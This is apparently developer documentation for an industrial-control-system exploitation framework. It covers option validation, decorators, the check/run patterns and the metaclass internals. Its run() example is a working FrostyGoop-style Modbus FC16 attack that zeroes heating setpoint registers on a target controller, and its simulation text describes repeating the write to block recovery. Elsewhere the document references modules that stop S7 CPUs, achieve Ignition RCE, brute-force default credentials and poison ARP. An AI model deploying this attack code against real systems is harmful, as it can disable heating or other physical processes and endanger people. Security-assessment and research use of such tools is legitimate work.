1. Try `int(value)`.
2. If `min_value` is set and `v < min_value`, raise `OptionValidationError` with message `"{v} < minimum {min_value}"`.
3. If `max_value` is set and `v > max_value`, raise `OptionValidationError` with message `"{v} > maximum {max_value}"`.

**Valid inputs (no bounds):**

| Input | Stored as |
|-------|-----------|
| `0` | `0` |
| `-1` | `-1` |
| `1000` | `1000` |
| `"247"` | `247` |

**Invalid inputs:**

| Input | Error message |
|-------|--------------|
| `"abc"` | `Expected integer, got: 'abc'` |
| `1.5` | `Expected integer, got: 1.5` |
| `"1.5"` | `Expected integer, got: '1.5'` |
| `None` | `Expected integer, got: None` |
| `3` (when `min_value=5`) | `3 < minimum 5` |
| `300` (when `max_value=247`) | `300 > maximum 247` |

**Common declaration patterns:**

```python
unit_id  = OptInteger(1,   "Modbus unit ID (1-247)",      min_value=1,  max_value=247)
slot     = OptInteger(2,   "PLC rack/slot (0-31)",         min_value=0,  max_value=31)
timeout  = OptInteger(5,   "Timeout in seconds",           min_value=1,  max_value=120)
threads  = OptInteger(10,  "Concurrent thread count",      min_value=1,  max_value=256)
retries  = OptInteger(3,   "Retry count on failure",       min_value=0,  max_value=10)
count    = OptInteger(100, "Number of packets to send",    min_value=1)
register = OptInteger(0,   "Starting register address",    min_value=0,  max_value=65535)
quantity = OptInteger(10,  "Number of registers to read",  min_value=1,  max_value=125)
rate_ms  = OptInteger(300, "Milliseconds between requests",min_value=0)
```

**Terminal session:**
```
ixf (Modbus Detect) > set unit_id 1
[*] unit_id => 1

ixf (Modbus Detect) > set unit_id 247
[*] unit_id => 247

ixf (Modbus Detect) > set unit_id 0
[-] Validation error for 'unit_id': 0 < minimum 1

ixf (Modbus Detect) > set unit_id 300
[-] Validation error for 'unit_id': 300 > maximum 247

ixf (Modbus Detect) > set unit_id abc
[-] Validation error for 'unit_id': Expected integer, got: 'abc'
```

---

### `OptFloat`

**File:** `industrialxpl/core/exploit/option.py`

Accepts any floating-point number. No bounds checking is built in. String inputs are converted with `float()`.

**Constructor:**
```python
OptFloat(default: float, description: str, *, advanced: bool = False)
```

**Validation logic:**
1. Try `float(value)`.
2. If conversion fails, raise `OptionValidationError` with message `"Expected float, got: {value!r}"`.

**Valid inputs:**

| Input | Stored as | Notes |
|-------|-----------|-------|
| `1.5` | `1.5` | Standard float |
| `0.0` | `0.0` | Zero |
| `-0.3` | `-0.3` | Negative |
| `100` | `100.0` | Integer auto-converted |
| `"0.5"` | `0.5` | String auto-converted |
| `"1e-3"` | `0.001` | Scientific notation |

**Invalid inputs:**

| Input | Error message |
|-------|--------------|
| `"abc"` | `Expected float, got: 'abc'` |
| `"1,5"` | `Expected float, got: '1,5'` |
| `None` | `Expected float, got: None` |

**Declaration example:**
```python
rate_limit  = OptFloat(0.5, "Request rate limit in seconds between packets")
jitter      = OptFloat(0.1, "Random jitter added to rate limit (seconds)", advanced=True)
threshold   = OptFloat(0.9, "Detection confidence threshold (0.0-1.0)")
```

**Terminal session:**
```
ixf (DNP3 Flood) > set rate_limit 0.5
[*] rate_limit => 0.5

ixf (DNP3 Flood) > set rate_limit 0
[*] rate_limit => 0.0

ixf (DNP3 Flood) > set rate_limit abc
[-] Validation error for 'rate_limit': Expected float, got: 'abc'

ixf (DNP3 Flood) > set rate_limit 1,5
[-] Validation error for 'rate_limit': Expected float, got: '1,5'
```

---

### `OptString`

**File:** `industrialxpl/core/exploit/option.py`

Accepts any string value. No format validation is performed. The `validate()` method calls `str(value)` unconditionally — this means `OptString` never raises `OptionValidationError` on its own.

**Constructor:**
```python
OptString(default: str, description: str, *, advanced: bool = False)
```

**Validation logic:**
1. Return `str(value)` — always succeeds.

**Declaration examples:**

```python
username      = OptString("admin",   "Login username")
password      = OptString("",        "Login password")
payload       = OptString("",        "Custom payload string (hex or ASCII)")
output_format = OptString("table",   "Output format: table | json | layer")
interface     = OptString("eth0",    "Network interface for raw socket operations")
domain        = OptString("",        "Windows domain for credential testing")
custom_command= OptString("",        "Custom shell command to execute after RCE", advanced=True)
```

**Terminal session:**
```
ixf (S7 Default Creds) > set username admin
[*] username => admin

ixf (S7 Default Creds) > set password ""
[*] password => 

ixf (S7 Default Creds) > set output_format json
[*] output_format => json

ixf (MITRE Coverage) > set output_format layer
[*] output_format => layer
```

---

### `OptBool`

**File:** `industrialxpl/core/exploit/option.py`

Accepts boolean values. Both native Python booleans and string representations are accepted, case-insensitively.

**Constructor:**
```python
OptBool(default: bool, description: str, *, advanced: bool = False)
```

**Validation logic:**
1. If value is already a `bool`, return it directly.
2. Convert to lowercase string and strip whitespace.
3. If in `{"true", "yes", "1", "on"}`, return `True`.
4. If in `{"false", "no", "0", "off"}`, return `False`.
5. Otherwise raise `OptionValidationError`.

**Valid truthy inputs:**

| Input | Stored as |
|-------|-----------|
| `True` | `True` |
| `"true"` | `True` |
| `"True"` | `True` |
| `"TRUE"` | `True` |
| `"yes"` | `True` |
| `"YES"` | `True` |
| `"1"` | `True` |
| `"on"` | `True` |
| `"ON"` | `True` |

**Valid falsy inputs:**

| Input | Stored as |
|-------|-----------|
| `False` | `False` |
| `"false"` | `False` |
| `"False"` | `False` |
| `"FALSE"` | `False` |
| `"no"` | `False` |
| `"NO"` | `False` |
| `"0"` | `False` |
| `"off"` | `False` |
| `"OFF"` | `False` |

**Invalid inputs:**

| Input | Error message |
|-------|--------------|
| `"maybe"` | `Expected boolean (true/false/yes/no), got: 'maybe'` |
| `"enabled"` | `Expected boolean (true/false/yes/no), got: 'enabled'` |
| `2` | `Expected boolean (true/false/yes/no), got: '2'` |
| `"y"` | `Expected boolean (true/false/yes/no), got: 'y'` |
| `"n"` | `Expected boolean (true/false/yes/no), got: 'n'` |

**Declaration examples:**
```python
simulate    = OptBool(True,  "Simulate mode: describe action without sending payload (default: True)")
destructive = OptBool(False, "Enable live exploitation — may cause irreversible damage")
verbose     = OptBool(False, "Enable verbose debug output", advanced=True)
ssl         = OptBool(False, "Use TLS/SSL for connection")
verify_cert = OptBool(True,  "Verify TLS certificate", advanced=True)
```

**Terminal session:**
```
ixf (S7 Stop CPU) > set simulate false
[*] simulate => False

ixf (S7 Stop CPU) > set simulate yes
[*] simulate => True

ixf (S7 Stop CPU) > set destructive on
[*] destructive => True

ixf (S7 Stop CPU) > set verbose 1
[*] verbose => True

ixf (S7 Stop CPU) > set simulate maybe
[-] Validation error for 'simulate': Expected boolean (true/false/yes/no), got: 'maybe'

ixf (S7 Stop CPU) > set destructive enabled
[-] Validation error for 'destructive': Expected boolean (true/false/yes/no), got: 'enabled'
```

---

### `OptMAC`

**File:** `industrialxpl/core/exploit/option.py`

Accepts a MAC address. Both `:` and `-` separator formats are accepted. The stored value is always normalized to lowercase colon notation.

**Constructor:**
```python
OptMAC(default: str, description: str, *, advanced: bool = False)
```

**Validation logic:**
1. Strip whitespace.
2. Replace all `-` with `:` to normalize separators.
3. Split on `:` — must produce exactly 6 parts.
4. Each part must be exactly 2 characters long (hex digits).
5. If steps 3-4 fail, raise `OptionValidationError`.
6. Return `value.lower()` — normalized to lowercase.

Note: The validator does not verify that each octet contains only valid hex characters (0-9, a-f). It validates structural format only (6 groups of 2 characters). This is an intentional design choice to allow testing with non-standard MAC patterns.

**Valid inputs:**

| Input | Normalized output |
|-------|------------------|
| `"00:11:22:33:44:55"` | `"00:11:22:33:44:55"` |
| `"00-11-22-33-44-55"` | `"00:11:22:33:44:55"` |
| `"AA:BB:CC:DD:EE:FF"` | `"aa:bb:cc:dd:ee:ff"` |
| `"aa:bb:cc:dd:ee:ff"` | `"aa:bb:cc:dd:ee:ff"` |
| `"DE:AD:BE:EF:00:01"` | `"de:ad:be:ef:00:01"` |

**Invalid inputs:**

| Input | Error message |
|-------|--------------|
| `"00:11:22:33:44"` | `'00:11:22:33:44' is not a valid MAC address.` |
| `"00:11:22:33:44:55:66"` | `'00:11:22:33:44:55:66' is not a valid MAC address.` |
| `"not-a-mac"` | `'not-a-mac' is not a valid MAC address.` |
| `"AABBCCDDEEFF"` | `'AABBCCDDEEFF' is not a valid MAC address.` |
| `"00:1:22:33:44:55"` | `'00:1:22:33:44:55' is not a valid MAC address.` (octet `1` has only 1 char) |

**Declaration example:**
```python
target_mac = OptMAC("", "Target device MAC address for ARP/PROFINET targeting")
gateway_mac = OptMAC("", "Gateway MAC for MITM attack (ARP poisoning target)")
```

**Terminal session:**
```
ixf (PROFINET DCP Identify) > set target_mac 00:1B:1B:0A:00:01
[*] target_mac => 00:1b:1b:0a:00:01

ixf (PROFINET DCP Identify) > set target_mac 00-1B-1B-0A-00-01
[*] target_mac => 00:1b:1b:0a:00:01

ixf (PROFINET DCP Identify) > set target_mac AABBCCDDEEFF
[-] Validation error for 'target_mac': 'AABBCCDDEEFF' is not a valid MAC address.

ixf (PROFINET DCP Identify) > set target_mac 00:11:22:33:44
[-] Validation error for 'target_mac': '00:11:22:33:44' is not a valid MAC address.
```

---

### `OptWordlist`

**File:** `industrialxpl/core/exploit/option.py`

Accepts a path to a wordlist file. Three input formats are supported. The file must exist and be readable at validation time.

**Constructor:**
```python
OptWordlist(default: str, description: str, *, advanced: bool = False)
```

**Validation logic:**
1. Strip whitespace.
2. If value starts with `file://`, strip that prefix to get the absolute path.
3. If the resulting path is not absolute, join it with `WORDLISTS_DIR` (`industrialxpl/resources/wordlists/`).
4. If the path is non-empty and `os.path.isfile(path)` returns False, raise `OptionValidationError`.
5. Return the original value (with `file://` prefix preserved if provided).

**Three supported input formats:**

| Format | Example | Resolution |
|--------|---------|-----------|
| Relative name (basename only) | `ics_common_passwords.txt` | Resolved to `industrialxpl/resources/wordlists/ics_common_passwords.txt` |
| Absolute filesystem path | `/opt/wordlists/rockyou.txt` | Used as-is |
| `file://` URI | `file:///opt/wordlists/custom.txt` | Strips `file://` prefix, uses the rest as absolute path |

**Built-in wordlists** (under `industrialxpl/resources/wordlists/`):

| Filename | Contents |
|----------|---------|
| `ics_common_passwords.txt` | Common ICS/SCADA default passwords |
| `plc_usernames.txt` | Common PLC/HMI username list |
| `siemens_default_creds.txt` | Siemens product default credentials |
| `rockwell_default_creds.txt` | Rockwell/Allen-Bradley default credentials |
| `schneider_default_creds.txt` | Schneider Electric default credentials |
| `modbus_unit_ids.txt` | Common Modbus unit IDs to enumerate |

**Invalid inputs:**

| Input | Error message |
|-------|--------------|
| `"nonexistent.txt"` | `Wordlist file not found: /path/to/industrialxpl/resources/wordlists/nonexistent.txt` |
| `"/tmp/missing.txt"` | `Wordlist file not found: /tmp/missing.txt` |
| `"file:///missing.txt"` | `Wordlist file not found: /missing.txt` |

**Declaration example:**
```python
wordlist   = OptWordlist("ics_common_passwords.txt", "Password wordlist file")
user_list  = OptWordlist("plc_usernames.txt",         "Username list file")
```

**Terminal session:**
```
ixf (S7 Default Creds) > set wordlist ics_common_passwords.txt
[*] wordlist => ics_common_passwords.txt

ixf (S7 Default Creds) > set wordlist file:///opt/custom_passwords.txt
[*] wordlist => file:///opt/custom_passwords.txt

ixf (S7 Default Creds) > set wordlist /opt/wordlists/rockyou.txt
[*] wordlist => /opt/wordlists/rockyou.txt

ixf (S7 Default Creds) > set wordlist nonexistent.txt
[-] Validation error for 'wordlist': Wordlist file not found: /path/to/industrialxpl/resources/wordlists/nonexistent.txt

ixf (S7 Default Creds) > set wordlist file:///opt/missing.txt
[-] Validation error for 'wordlist': Wordlist file not found: /opt/missing.txt
```

---

### `OptEncoder`

**File:** `industrialxpl/core/exploit/option.py`

Accepts an encoder name string. No format validation is performed — the value is passed directly to the encoding pipeline. This is the most permissive option type.

**Constructor:**
```python
OptEncoder(default: str, description: str, *, advanced: bool = False)
```

**Validation logic:**
1. Return `str(value).strip()` — always succeeds.

**Common encoder values:**

| Value | Effect |
|-------|--------|
| `""` | No encoding (raw bytes) |
| `"base64"` | Base64 encode the payload |
| `"hex"` | Hex-encode the payload |
| `"raw"` | Explicit raw encoding (same as empty) |
| `"xor:0x41"` | XOR each byte with `0x41` |
| `"url"` | URL-encode the payload |

**Declaration example:**
```python
encoder = OptEncoder("", "Output encoder for the generated payload (base64, hex, raw, xor:KEY)")
```

**Terminal session:**
```
ixf (S7 Stop CPU) > set encoder base64
[*] encoder => base64

ixf (S7 Stop CPU) > set encoder hex
[*] encoder => hex

ixf (S7 Stop CPU) > set encoder xor:0xff
[*] encoder => xor:0xff

ixf (S7 Stop CPU) > set encoder ""
[*] encoder => 
```

---

### Advanced Options

Any option can be marked `advanced=True` in its constructor. Advanced options:

- Are hidden from `show options` output.
- Are visible in `show advanced` output.
- Behave identically to regular options in all other respects.
- Can still be set with `set <option> <value>`.

**Declaration examples:**
```python
verbose     = OptBool(False,  "Enable verbose debug output",              advanced=True)
timeout     = OptInteger(5,   "Override connection timeout (seconds)",    advanced=True)
jitter      = OptFloat(0.0,   "Random jitter added to delays (seconds)",  advanced=True)
user_agent  = OptString("",   "Custom HTTP User-Agent header",            advanced=True)
verify_cert = OptBool(True,   "Verify TLS/SSL certificate chain",         advanced=True)
```

**Shell display:**
```
ixf (Ignition RCE) > show options

  Module Options (exploits/scada/ignition/ignition_rce)
  ─────────────────────────────────────────────────────────────────
  Name          Current     Required  Description
  ────          ───────     ────────  ───────────
  target                    yes       Target device IP or hostname
  port          8088        yes       Ignition Gateway HTTP port
  simulate      True        yes       Simulate mode (default: True)
  destructive   False       yes       Enable live exploitation

ixf (Ignition RCE) > show advanced

  Advanced Options
  ─────────────────────────────────────────────────────────────────
  Name          Current     Description
  ────          ───────     ───────────
  verbose       False       Enable verbose debug output
  timeout       5           Override connection timeout (seconds)
  verify_cert   True        Verify TLS/SSL certificate chain
```

---

## Decorators

### `@mute`

**File:** `industrialxpl/core/exploit/exploit.py`

The `@mute` decorator suppresses all standard output generated inside the decorated function. It does this by pointing the thread-local `thread_output_stream.stream` to a `_DummyFile` instance whose `write()` and `flush()` methods are no-ops. After the function returns (or raises), the stream is reset to `None` (which causes subsequent output to use the real stdout again).

**Purpose:** `check()` is often called concurrently across many targets in a multi-threaded scan (`run_threads()`). Without `@mute`, print output from different threads would interleave unpredictably. With `@mute`, the check probe runs silently and the thread coordinator prints a clean summary.

**Technical detail:** `thread_output_stream` is a `threading.local()` object. The stream override applies only to the current thread. Other threads calling `print_status` / `print_error` on their own `check()` calls are unaffected.

**Usage:** Always apply `@mute` to `check()`. Do not apply it to `run()`.

```python
from industrialxpl.core.exploit import Exploit, OptIP, OptPort, mute, print_error

class Exploit(Exploit):
    __info__ = { ... }
    target = OptIP("", "Target IP")
    port   = OptPort(502, "Port")

    @mute
    def check(self) -> bool:
        """This method runs silently — all print_* calls are suppressed."""
        if not self.target:
            return False
        try:
            import socket
            s = socket.socket()
            s.settimeout(3)
            s.connect((self.target, self.port))
            s.close()
            return True
        except Exception:
            return False

    def run(self) -> None:
        """This method is NOT muted — output is visible."""
        # print_* calls here appear in the terminal normally
        ...
```

**What happens inside @mute:**
```python
# Source code of the mute decorator:
def mute(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        thread_output_stream.stream = _DummyFile()  # redirect to /dev/null
        try:
            return fn(*args, **kwargs)              # run the function silently
        finally:
            thread_output_stream.stream = None      # restore stdout
    return wrapper
```

---

### `@multi`

**File:** `industrialxpl/core/exploit/exploit.py`

The `@multi` decorator enables a module to accept a target file via the `file://` URI scheme. When `self.target` starts with `"file://"`, the decorator opens the file at the path after `file://`, reads every non-empty, non-comment line, and calls the decorated function once per line with `self.target` set to that line.

**Purpose:** Allows a single `run` invocation to sweep a list of targets without modifying the module's core logic.

**Target file format:**
- One IP address or hostname per line.
- Lines starting with `#` are treated as comments and skipped.
- Blank lines are skipped.
- No shell expansion or glob patterns are supported.

**Usage:**
```python
from industrialxpl.core.exploit import Exploit, OptIP, OptPort, multi, print_status

class Exploit(Exploit):
    __info__ = { ... }
    target = OptIP("", "Target IP or file:///path/to/targets.txt")
    port   = OptPort(502, "Port")

    @multi
    def run(self) -> None:
        # self.target is set to the current line from the file
        # This body is called once per target
        print_status("Scanning {}:{}".format(self.target, self.port))
        # ... actual scan logic ...
```

**Target file example (`/opt/targets.txt`):**
```
# Modbus TCP devices — Plant Floor A
192.168.10.1
192.168.10.2
192.168.10.3
# Control room HMIs
10.0.1.100
10.0.1.101

# Engineering workstation
172.16.0.50
```

**Shell session:**
```
ixf (Modbus Detect) > set target file:///opt/targets.txt
[*] target => file:///opt/targets.txt

ixf (Modbus Detect) > run
[*] [multi] Target: 192.168.10.1
[*] Scanning 192.168.10.1:502...
[+] Modbus device found at 192.168.10.1 (unit 1)

[*] [multi] Target: 192.168.10.2
[*] Scanning 192.168.10.2:502...
[-] No Modbus response from 192.168.10.2

[*] [multi] Target: 192.168.10.3
[*] Scanning 192.168.10.3:502...
[+] Modbus device found at 192.168.10.3 (unit 1)
...
```

**Error handling:** If the target file cannot be opened (missing file, permission denied), the decorator raises `RuntimeError: Cannot open target file: <os error message>`, which the shell displays as an error.

---

## Method Patterns

### `check()` Method Pattern

`check()` is the module's read-only connectivity and vulnerability probe. The shell calls `check()` automatically before `run()` in some workflows, and directly when the user runs the `check` command.

**Strict requirements:**

1. Must be decorated with `@mute` — always.
2. Must return `bool` — `True` if target appears present/vulnerable, `False` otherwise.
3. Must never send exploit payloads. Only benign probes: TCP connect, banner grab, minimal read-only protocol PDU.
4. Must handle all exceptions internally and return `False` on any error. Never let an exception propagate to the caller.
5. Must return `False` immediately if `self.target` is empty.
6. Must respect `self.timeout`.

**Complete annotated example (Modbus banner check):**

```python
@mute
def check(self) -> bool:
    """Test whether target responds to Modbus TC on the configured port.

    Sends a single Modbus FC3 (Read Holding Registers) request for
    register 0, quantity 1. A valid Modbus response header (>=8 bytes)
    indicates a live Modbus device.

    Returns:
        True  — Target responded with a Modbus-shaped response.
        False — Target unreachable, wrong port, or no Modbus service.
    """
    # Guard: target must be set before attempting connection
    if not self.target:
        return False

    try:
        # Open a plain TCP socket with the configured timeout
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.target, self.port))

        # Modbus Application Protocol (MBAP) Header (6 bytes)
        #   Transaction ID: 0x0001
        #   Protocol ID:    0x0000 (Modbus)
        #   Length:         0x0006 (6 bytes follow)
        # PDU (2 bytes):
        #   Unit ID: 0x01
        #   FC03:    0x03 (Read Holding Registers)
        #   Start:   0x0000
        #   Count:   0x0001 (read 1 register)
        probe = bytes.fromhex("000100000006010300000001")
        sock.sendall(probe)

        # A minimal Modbus response contains the 6-byte MBAP header
        # plus unit ID (1), FC (1), byte count (1), data (2) = 11 bytes.
        # We only need the header to confirm a Modbus service is present.
        response = sock.recv(64)
        sock.close()

        # Valid Modbus response: at least 8 bytes, protocol ID = 0x0000
        if len(response) >= 8:
            protocol_id = (response[2] << 8) | response[3]
            return protocol_id == 0x0000

        return False

    except (socket.timeout, ConnectionRefusedError, OSError):
        # Expected errors for unreachable or closed targets
        return False
    except Exception:
        # Catch-all for unexpected errors (protocol errors, etc.)
        return False
```

**Minimal check() for modules without network probing:**

```python
@mute
def check(self) -> bool:
    """Trivial check — returns True if target is set."""
    return bool(self.target)
```

**check() with vendor-specific banner inspection:**

```python
@mute
def check(self) -> bool:
    """Check for Siemens S7-1200 by inspecting COTP/S7comm handshake."""
    if not self.target:
        return False
    try:
        sock = socket.socket()
        sock.settimeout(self.timeout)
        sock.connect((self.target, self.port))

        # TPKT + COTP Connection Request (standard S7 connect sequence)
        cotp_cr = bytes.fromhex(
            "0300001611e00000001400c1020100c2020102c0010a"
        )
        sock.sendall(cotp_cr)
        resp = sock.recv(32)
        sock.close()

        # COTP Connection Confirm starts with 0x03 0x00 ... 0xD0
        return len(resp) > 5 and resp[0] == 0x03 and resp[5] == 0xD0

    except Exception:
        return False
```

---

### `run()` Method Pattern

`run()` is the module's main execution entry point. The shell calls it when the user issues the `run` or `exploit` command.

**Strict requirements:**

1. Must validate `self.target` first and return with an error if unset.
2. If `self.simulate` is `True`: call `DestructiveGate.print_simulation()` and return immediately. No packets sent.
3. If `self.simulate` is `False`: implement the actual exploit, scan, or assessment logic.
4. Must not call `DestructiveGate.require_confirmation()` directly — the shell handles that gate before calling `run()`.
5. Should use only `print_status`, `print_success`, `print_error`, `print_warning`, `print_info` for output.

**Complete annotated run() with simulate / live branches:**

```python
def run(self) -> None:
    """Execute FrostyGoop-style Modbus heating attack or print simulation.

    In simulate mode: prints the exact attack chain, payload hex, and
    MITRE techniques without sending any traffic.

    In live mode (simulate=False + destructive=True after gate confirmation):
    sends Modbus FC16 Write Multiple Registers commands to disable
    the heating setpoint on the target Modbus device.
    """
    # ── Validate required options ─────────────────────────────────────────
    if not self.target:
        print_error(
            "Set 'target' option first. "
            "Example: set target 192.168.1.100"
        )
        return

    # ── Simulate path — absolutely no packets ────────────────────────────
    if self.simulate:
        DestructiveGate.print_simulation(
            description=(
                "FrostyGoop TTP (2024) — Sandworm/GRU (Russia)\n\n"
                "Phase 1 [Discovery]: Scan for Modbus TCP port 502 on {target}\n"
                "Phase 2 [FC16 Write]: Write 0x0000 to holding registers "
                "(setpoint disable)\n"
                "Phase 3 [Loop]: Repeat write every 30 seconds to prevent "
                "manual recovery\n"
                "Physical Impact: Heating controllers offline — historical "
                "impact: 600 apartments in Lviv, Ukraine lost heat for 2 days "
                "(January 2024)"
            ).format(target=self.target),
            payload_hex=(
                "00 01 00 00 00 0B {unit} 10 00 00 00 02 04 "
                "00 00 00 00"
            ).format(unit=format(self.unit_id, "02x")),
            payload_human=(
                "Modbus FC16 Write Multiple Registers: "
                "address=0x0000, count=2, values=[0x0000, 0x0000] "
                "(zero out heating setpoint registers)"
            ),
            mitre_techniques=["T0836", "T0814"],
        )
        return

    # ── Live exploit path ─────────────────────────────────────────────────
    # Execution reaches here only when:
    #   1. simulate=False
    #   2. destructive=True
    #   3. DestructiveGate.require_confirmation() returned True
    #      (handled by the shell before calling run())

    print_status(
        "[FrostyGoop] Connecting to {}:{} (unit {})...".format(
            self.target, self.port, self.unit_id
        )
    )

    try:
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.target, self.port))

        print_status("[FrostyGoop] Connection established.")

        # Build Modbus FC16 Write Multiple Registers PDU
        # Writes 0x0000 to registers 0 and 1 (heating setpoint)
        def build_fc16(unit: int, address: int, values: list) -> bytes:
            count = len(values)
            byte_count = count * 2
            data = b"".join(v.to_bytes(2, "big") for v in values)
            length = 7 + byte_count
            return (
                b"\x00\x01\x00\x00"                        # MBAP transaction + protocol
                + length.to_bytes(2, "big")                # MBAP length
                + bytes([unit, 0x10])                      # unit ID, FC16
                + address.to_bytes(2, "big")               # start address
                + count.to_bytes(2, "big")                 # register count
                + bytes([byte_count])                      # byte count
                + data                                     # register values
            )

        payload = build_fc16(self.unit_id, 0x0000, [0x0000, 0x0000])
        sock.sendall(payload)
        response = sock.recv(12)
        sock.close()

        if len(response) >= 8 and response[7] == 0x10:
            print_success(
                "[FrostyGoop] FC16 write confirmed — heating registers "
                "zeroed on {}:{}".format(self.target, self.port)
            )
        else:
            print_error("[FrostyGoop] Unexpected response — write may have failed.")

    except ConnectionRefusedError:
        print_error(
            "Connection refused on {}:{} — Modbus port may be closed.".format(
                self.target, self.port
            )
        )
    except socket.timeout:
        print_error(
            "Connection timed out after {}s.".format(self.timeout)
        )
    except Exception as exc:
        print_error("Unexpected error during execution: {}".format(exc))
```

---

## `get_info()` Method

**Defined in:** `industrialxpl/core/exploit/exploit.py` (class `BaseExploit`)

`get_info()` retrieves the `__info__` dictionary for any loaded module. It is necessary because the `ExploitOptionsAggregator` metaclass renames the key from `__info__` to `_{ClassName}__info__` to prevent Python's name mangling from causing issues across inheritance chains.

**Source code:**
```python
def get_info(self) -> dict:
    """Return the module's __info__ dict (survives metaclass name mangling)."""
    for cls in type(self).__mro__:
        key = "_{name}__info__".format(name=cls.__name__)
        val = cls.__dict__.get(key)
        if val is not None:
            return val
    return {}
```

**How it works:**

1. Iterates through the class's Method Resolution Order (MRO) — the list of classes from most-derived to base.
2. For each class in the MRO, constructs the mangled key name `_{ClassName}__info__`.
3. Checks `cls.__dict__` directly (not `getattr`, to avoid descriptor lookup).
4. Returns the first non-None value found.
5. Returns `{}` if no `__info__` is found anywhere in the hierarchy.

**Why MRO traversal is required:** When `class Exploit(Exploit)` is defined in a module file, both the module class and the base class are named `Exploit`. The metaclass stores the module's `__info__` as `_Exploit__info__` on the module class. The base `Exploit` class's `__info__` (if any) is stored as `_Exploit__info__` on the base class. The MRO traversal returns the most-derived class's dictionary first.

**Usage — shell `show info` command:**
```
ixf (FrostyGoop Modbus Heating) > show info

  Module: cve/malware/frostygoop_modbus_heating
  ─────────────────────────────────────────────────────────────────
  Name:        FrostyGoop Modbus Heating Attack (Extended)
  Description: Replicates FrostyGoop TTP used by Sandworm/GRU in
               January 2024 to disable heating in 600 Lviv apartments.
  Authors:     Andre Henrique (@mrhenrike) | Uniao Geek
  CVE:         N/A (malware TTP — no CVE assigned)
  CVSS:        N/A
  Severity:    CATASTROPHIC
  Impact:      CATASTROPHIC
  Devices:     Modbus RTU/TCP heating controllers
  Techniques:  T0836 (Modify Parameter), T0814 (Denial of Control)
  Tactics:     Impair Process Control, Impact
  References:
    https://www.dragos.com/blog/frostygoop/
    https://attack.mitre.org/techniques/T0836/
```

**Programmatic usage:**
```python
from industrialxpl.core.exploit.utils import import_exploit

# Load the class and instantiate it
ExploitClass = import_exploit(
    "industrialxpl.modules.cve.malware.frostygoop_modbus_heating"
)
module_instance = ExploitClass()

# Retrieve metadata
info = module_instance.get_info()

print(info["name"])             # FrostyGoop Modbus Heating Attack (Extended)
print(info["impact"])           # CATASTROPHIC
print(info["cve"])              # N/A
print(info["mitre_techniques"]) # ['T0836', 'T0814']
print(info["authors"])          # ('Andre Henrique (@mrhenrike) | Uniao Geek',)

# Access all fields
for key, value in info.items():
    print("{:25s}: {}".format(key, value))
```

---

## Protocol Enum

**Defined in:** `industrialxpl/core/exploit/exploit.py` (class `Protocol`)

The `Protocol` class is a namespace of string constants used to set `target_protocol` on exploit classes. The shell and scanner coordinator use `target_protocol` to categorize modules and to select appropriate scanning strategies.

**All constants:**

| Attribute | String value | Protocol / Transport |
|-----------|-------------|---------------------|
| `Protocol.CUSTOM` | `"custom"` | Unknown or generic protocol |
| `Protocol.TCP` | `"custom/tcp"` | Raw TCP (no application protocol) |
| `Protocol.UDP` | `"custom/udp"` | Raw UDP |
| `Protocol.FTP` | `"ftp"` | File Transfer Protocol |
| `Protocol.SFTP` | `"sftp"` | SSH File Transfer Protocol |
| `Protocol.SSH` | `"ssh"` | Secure Shell |
| `Protocol.TELNET` | `"telnet"` | Telnet (common on legacy OT devices) |
| `Protocol.HTTP` | `"http"` | HTTP (SCADA web interfaces, HMI REST APIs) |
| `Protocol.HTTPS` | `"https"` | HTTPS |
| `Protocol.SNMP` | `"snmp"` | SNMP (network device management) |
| `Protocol.MODBUS` | `"modbus/tcp"` | Modbus TCP (IEC 61158 compatible) |
| `Protocol.S7` | `"s7comm"` | Siemens S7comm / S7comm-Plus (port 102) |
| `Protocol.ENIP` | `"ethernet/ip"` | EtherNet/IP (CIP over TCP/UDP, port 44818) |
| `Protocol.DNP3` | `"dnp3"` | DNP3 (Distributed Network Protocol, port 20000) |
| `Protocol.BACNET` | `"bacnet/ip"` | BACnet/IP (ASHRAE 135, port 47808 UDP) |

**Usage in a module:**
```python
from industrialxpl.core.exploit import Exploit
from industrialxpl.core.exploit.exploit import Protocol

class Exploit(Exploit):
    __info__ = { ... }

    # Declares this module targets the Modbus TCP protocol
    target_protocol = Protocol.MODBUS
    ...
```

**Extending with custom protocols:**

If your module targets a protocol not in the enum, use a descriptive string directly:

```python
target_protocol = "iec60870-5-104"   # IEC 60870-5-104 (T104)
target_protocol = "profinet/dcp"     # PROFINET DCP
target_protocol = "mms"              # MMS (IEC 61850)
target_protocol = "srtp"             # GE SRTP
target_protocol = "opcua"            # OPC UA
target_protocol = "fins"             # Omron FINS
target_protocol = "melsec"           # Mitsubishi MELSEC
```

---

## Metaclass: ExploitOptionsAggregator

**Defined in:** `industrialxpl/core/exploit/exploit.py`

`ExploitOptionsAggregator` is the Python metaclass that powers IXF's option system and `__info__` handling. It runs once per class definition at import time, not at instance creation.

**What it does:**

1. **Inherits `exploit_attributes` from base classes.** It merges the `exploit_attributes` dictionaries from all base classes. This means that `simulate` and `destructive` options declared on `BaseExploit` are automatically available in every module without re-declaration.

2. **Collects `Option` descriptors.** For every class attribute that is an instance of `Option` (i.e., `OptIP`, `OptPort`, `OptInteger`, etc.), it:
   - Sets `value.label = key` so the descriptor knows its own name.
   - Adds an entry to `exploit_attributes[key]` = `[display_value, description, advanced_flag]`.

3. **Mangles `__info__`.** If the class body contains a `__info__` key, the metaclass renames it to `_{ClassName}__info__` and deletes the original key. This prevents Python's name mangling from conflicting across an inheritance chain where both the base and the derived class are named `Exploit`.

**How `exploit_attributes` works:**

After class creation, `Exploit.exploit_attributes` is a dict like:

```python
{
    "simulate":    [True,  "Simulate mode: describe action without ...", False],
    "destructive": [False, "Enable destructive execution ...",           False],
    "target":      ["",    "Target device IP or hostname",               False],
    "port":        [502,   "Modbus TCP port",                            False],
    "unit_id":     [1,     "Modbus unit ID (1-247)",                     False],
    "timeout":     [5,     "Connection timeout (seconds)",               True],  # advanced
}
```

Each entry: `[default_value, description_string, is_advanced_bool]`.

The shell uses `exploit_attributes` for:
- Building the `show options` table (non-advanced entries only).
- Building the `show advanced` table (advanced entries only).
- Tab-completion of option names.

**`__info__` mangling in practice:**

```python
# In the class body you write:
class Exploit(Exploit):
    __info__ = {"name": "My Module", ...}

# After metaclass processing, the class dict contains:
# _Exploit__info__ = {"name": "My Module", ...}
